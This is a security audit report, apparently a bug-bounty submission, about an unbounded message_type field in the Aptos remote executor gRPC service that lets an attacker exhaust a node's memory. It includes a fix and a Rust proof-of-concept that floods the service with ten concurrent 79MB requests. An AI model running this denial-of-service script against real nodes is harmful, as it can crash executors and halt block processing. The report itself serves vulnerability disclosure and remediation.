# Audit Report

## Title
Remote Executor Service Memory Exhaustion via Unbounded `message_type` String

## Summary
The remote executor service's gRPC `NetworkMessage` protobuf contains an unbounded `message_type` string field that can be exploited to cause memory exhaustion on executor nodes. An attacker with network access to the service can send messages with extremely large strings (up to ~80MB each), exhausting node memory and causing crashes.

## Finding Description

The vulnerability exists in the remote executor service used for sharded block execution. The protobuf definition for `NetworkMessage` contains an unbounded string field `message_type` that lacks any size validation. [1](#0-0) 

When the gRPC service receives messages, it directly converts the unbounded `message_type` string into a `MessageType` struct without any length validation: [2](#0-1) 

While the gRPC service sets a maximum total message size of 80MB, this limit applies to the entire message, not individual fields. An attacker can craft messages with minimal `message` payload and a near-80MB `message_type` string: [3](#0-2) 

The `message_type` is then:
1. Cloned when creating the `MessageType` wrapper
2. Used as a HashMap key for routing messages
3. Potentially cloned again for hashing operations

This service is integrated into the production executor workflow and used when remote executor addresses are configured: [4](#0-3) 

The service lacks any authentication or authorization layer, accepting connections from any network peer that can reach the endpoint: [5](#0-4) 

**Attack Path:**
1. Attacker gains network access to executor service endpoint (e.g., through internal network compromise, misconfiguration, or if exposed externally)
2. Sends multiple gRPC `SimpleMsgExchange` requests with ~80MB `message_type` strings
3. Each request allocates substantial memory (80MB+ with cloning)
4. Concurrent/rapid requests multiply memory consumption
5. Node exhausts available memory and crashes

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

**Severity: HIGH**

This vulnerability maps to the Aptos Bug Bounty "High Severity" category for:
- **Validator node slowdowns**: Memory pressure degrades performance
- **API crashes**: Memory exhaustion causes node crashes

The impact is significant because:
1. **Executor Node Disruption**: Crashing executor nodes disrupts block execution in sharded execution mode
2. **Chain Liveness**: If enough executor nodes crash, block processing halts
3. **No Authentication Required**: No privileged access needed, only network connectivity
4. **Amplification**: Each 80MB string allocation is multiplied by cloning operations
5. **Persistent Impact**: Repeated attacks can keep nodes down

While the service appears designed for internal use between executor shards, this represents a critical defense-in-depth failure. An attacker who compromises any machine on the internal network, or exploits network misconfigurations, can leverage this vulnerability.

## Likelihood Explanation

**Likelihood: Medium to High** (depending on deployment)

The likelihood depends on network exposure:

**Factors Increasing Likelihood:**
- No authentication/authorization on the service
- No input validation on string length
- Service is used in production when remote addresses configured
- Internal network compromise is a realistic attack vector
- Misconfigurations could expose service externally

**Factors Decreasing Likelihood:**
- Service intended for trusted internal network communication
- May be deployed on isolated networks in production
- Requires network-level access to exploit

However, even on "trusted" internal networks, this represents a significant vulnerability. Modern security practices emphasize defense-in-depth, and the lack of input validation violates this principle.

## Recommendation

Implement strict bounds on the `message_type` field size:

1. **Protobuf Level**: Add validation constraints to the protobuf definition (if using protobuf validators)

2. **Application Level**: Validate string length before processing:

```rust
// In grpc_network_service/mod.rs, simple_msg_exchange function
const MAX_MESSAGE_TYPE_LENGTH: usize = 256; // Reasonable limit for message type identifiers

async fn simple_msg_exchange(
    &self,
    request: Request<NetworkMessage>,
) -> Result<Response<Empty>, Status> {
    let _timer = NETWORK_HANDLER_TIMER
        .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
        .start_timer();
    let remote_addr = request.remote_addr();
    let network_message = request.into_inner();
    
    // Validate message_type length
    if network_message.message_type.len() > MAX_MESSAGE_TYPE_LENGTH {
        return Err(Status::invalid_argument(format!(
            "message_type exceeds maximum length of {} bytes",
            MAX_MESSAGE_TYPE_LENGTH
        )));
    }
    
    let msg = Message::new(network_message.message);
    let message_type = MessageType::new(network_message.message_type);
    
    // ... rest of function
}
```

3. **Additional Hardening**:
   - Implement authentication/TLS for inter-shard communication
   - Add rate limiting per source IP
   - Monitor memory usage and implement alerts
   - Use string interning for frequently-used message types

## Proof of Concept

```rust
// PoC: Memory exhaustion attack on remote executor service
// This would be run as a separate binary/test

use tonic::Request;
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to executor service (adjust address as needed)
    let target_address = "http://127.0.0.1:52200";
    let mut client = NetworkMessageServiceClient::connect(target_address).await?;
    
    // Create a message with huge message_type string (79MB)
    let huge_string = "A".repeat(79 * 1024 * 1024);
    
    // Send multiple concurrent requests to exhaust memory
    let mut handles = vec![];
    for i in 0..10 {
        let mut client_clone = client.clone();
        let huge_string_clone = huge_string.clone();
        
        let handle = tokio::spawn(async move {
            let request = Request::new(NetworkMessage {
                message: vec![0u8; 1], // Minimal payload
                message_type: format!("attack_{}", i) + &huge_string_clone,
            });
            
            match client_clone.simple_msg_exchange(request).await {
                Ok(_) => println!("Request {} succeeded", i),
                Err(e) => println!("Request {} failed: {}", i, e),
            }
        });
        
        handles.push(handle);
    }
    
    // Wait for all requests
    for handle in handles {
        handle.await?;
    }
    
    Ok(())
}
```

**Expected Result**: The target executor service node experiences severe memory pressure, potentially leading to OOM (Out of Memory) conditions and node crash. Each request allocates ~80MB+ (with cloning overhead), and 10 concurrent requests would attempt to allocate ~800MB+ simultaneously.

## Notes

- This vulnerability affects the sharded block execution infrastructure when remote executor addresses are configured
- The lack of authentication on the gRPC service compounds the issue
- Even on internal networks, defense-in-depth requires input validation
- The Aptos Bug Bounty exclusion for "network-level DoS" does not apply here - this is an application-level resource exhaustion vulnerability in the protocol design itself

### Citations

**File:** protos/rust/src/pb/aptos.remote_executor.v1.rs (L8-13)
```rust
pub struct NetworkMessage {
    #[prost(bytes="vec", tag="1")]
    pub message: ::prost::alloc::vec::Vec<u8>,
    #[prost(string, tag="2")]
    pub message_type: ::prost::alloc::string::String,
}
```

**File:** secure/net/src/grpc_network_service/mod.rs (L23-23)
```rust
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80;
```

**File:** secure/net/src/grpc_network_service/mod.rs (L75-88)
```rust
        Server::builder()
            .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
            .add_service(
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
            )
            .add_service(reflection_service)
            .serve_with_shutdown(server_addr, async {
                server_shutdown_rx.await.ok();
                info!("Received signal to shutdown server at {:?}", server_addr);
            })
            .await
            .unwrap();
        info!("Server shutdown at {:?}", server_addr);
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** execution/executor/src/workflow/do_get_execution_output.rs (L256-276)
```rust
    fn execute_block_sharded<V: VMBlockExecutor>(
        partitioned_txns: PartitionedTransactions,
        state_view: Arc<CachedStateView>,
        onchain_config: BlockExecutorConfigFromOnchain,
    ) -> Result<Vec<TransactionOutput>> {
        if !get_remote_addresses().is_empty() {
            Ok(V::execute_block_sharded(
                &REMOTE_SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
        } else {
            Ok(V::execute_block_sharded(
                &SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
        }
    }
```
